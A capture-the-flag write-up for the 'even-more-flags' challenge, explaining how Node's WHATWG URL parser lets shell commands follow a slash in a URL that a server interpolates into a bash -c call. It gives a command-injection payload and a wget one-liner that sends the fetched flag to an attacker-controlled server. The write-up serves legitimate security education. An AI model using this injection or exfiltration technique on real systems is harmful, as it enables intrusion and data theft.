# Even-more-flags Writeup from L.A.R.S.

## Setup

As always, for the local setup we run the docker container:
```bash
docker build -t even-more-flags . && docker run -p 1337:1337 -t even-more-flags
```

And for remote we use the suggested command:
```bash
ncat --ssl even-more-flags.ctf.kitctf.de 443
```
This gives us an instance for 29 minutes -- we can make it!


## Looking around

### Dockerfile

From the `Dockerfile` we can learn that chrome is installed (together with some fonts) and a node server (using `package.json` and `server.js`) is started up.
The flag seems to be stored in `/flag`.

### server.js

From the `server.js` we can learn that there's an interface for entering a URL. After submitting, chrome is started with all the flags from `flags.txt`, opening the url we entered.
Notably, the url is checked:
```js
let parsed = new URL(url);
if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') {
  return res.status(400).send('Invalid URL');
}
```
... and appended like this:
```js
const command = `bash -c "google-chrome-stable --disable-gpu --headless=new --no-sandbox --no-first-run ${flags} ${url}"`;
```
After some time it's killed again.

Also, the flag seems to be available with the `/flag` endpoint, but only for localhost connections.

### flags.txt

In `flags.txt` we do indeed seem to find all the flags available.
So it's not even more flags after all!

## Exploiting

### A dream of injection

So the url has to start with `http:` or `https:` and somehow be parsable to a `URL`. That doesn't mean though that no injection is possible:
We *should* be able to append an ampersand after a valid url part, so that *in parallel* to the chrome process, some other process is executed.

The `stdout` seems to be printed to the console, so we should be able to see results in our local docker. So let's try a simple code injection:
```
https://test.org & echo 'Hi!'
```
But that fails:
```js
TypeError: Invalid URL
    at new URL (node:internal/url:797:36)
    at /app/server.js:44:16
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at next (/app/node_modules/express/lib/router/route.js:149:13)
    at Route.dispatch (/app/node_modules/express/lib/router/route.js:119:3)
    at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)
    at /app/node_modules/express/lib/router/index.js:284:15
    at Function.process_params (/app/node_modules/express/lib/router/index.js:346:12)
    at next (/app/node_modules/express/lib/router/index.js:280:10)
    at /app/server.js:20:3
```

There seems to be something wrong... After playing around a bit, we can figure out that the string
```
https://test.org/ & echo 'Hi!'
```
works and `Hi!` is printed to `Stdout`. But *why*?

### Excursion to Nodes URL

From the [documentation](https://nodejs.org/api/url.html#the-whatwg-url-api) we can learn that the `URL` class is
> implemented by following the WHATWG URL Standard.

The problem seems to be that space is [forbidden in the host](https://url.spec.whatwg.org/#host-miscellaneous):
> A forbidden host code point is U+0000 NULL, U+0009 TAB, U+000A LF, U+000D CR, U+0020 SPACE, U+0023 (#), U+002F (/), U+003A (:), U+003C (<), U+003E (>), U+003F (?), U+0040 (@), U+005B ([), U+005C (\), U+005D (]), U+005E (^), or U+007C (|).

As we can see [in this part of the specs](https://url.spec.whatwg.org/#hostname-state) the *host state* ends at a slash and the *path start state* is entered:
> ...
> 3. Otherwise, if one of the following is true:
> - c is the EOF code point, U+002F (/), U+003F (?), or U+0023 (#)
> [...]
> then[...]
> [...]
> 5. Set url’s host to host, buffer to the empty string, and state to path start state. 

There the url [is special](https://url.spec.whatwg.org/#special-scheme), since it's `http` or `https`, so the [*path state*](https://url.spec.whatwg.org/#path-state) is entered.
Since there was indeed a `/`, there's no `\`, the buffer is not a double-dot URL path segment, nor a single-dot URL path segment and the url's scheme is not "file", the buffer is appended to the url's path.
This gets a bit more complicated still, but basically what happens is that the `/` indicates that the stuff afterwards relates to the path, not to the domain.
Otherwise the space is parsed as part of the domain, which is doomed to fail.

So, long story short, if we have a `/` somewhere in the "normal" URL, we can write (almost) everything we want afterwards.


### Just upload it!

With all that we can now inject `bash` code. 
For example, the minimal url to print *Hi* to `stdout` would be:
```bash
http:./ & echo "Hi"
```
Lucky for us that the chrome process doesn't need to do anything sensible with that url...
However, we do want to do something sensible; that is, we don't just want to echo *Hi* to the console, but rather capture the flag!

For that the idea is to read the flag and make an http request to some webserver we control, from which we can read the flag from the logs. This could look something like this then:
```bash
http:./ & wget <some-url-where-we-can-view-logs>?data=`wget localhost:1337/flag -O -`
```

And indeed, if we run this in our docker, we can see the fake flag being submitted in the docker logs, and the fake flag arriving in our server docs.

If we now use this exploit url on the remote, we **receive our flag!**
